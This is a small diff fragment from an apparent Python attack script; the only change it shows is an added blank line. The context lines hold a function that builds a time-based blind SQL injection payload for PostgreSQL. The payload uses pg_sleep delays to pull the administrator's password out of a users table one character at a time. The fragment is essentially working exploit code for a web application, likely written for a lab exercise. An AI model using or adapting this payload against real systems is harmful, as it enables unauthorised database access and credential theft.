@@ -2,6 +2,7 @@ import requests
 import time
 
 
+
 def bad_sql_query(indice: str=None, parameter: str=None):
     bad_sql = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{indice},1) FROM users WHERE username = 'administrator'){parameter} THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
     return bad_sql
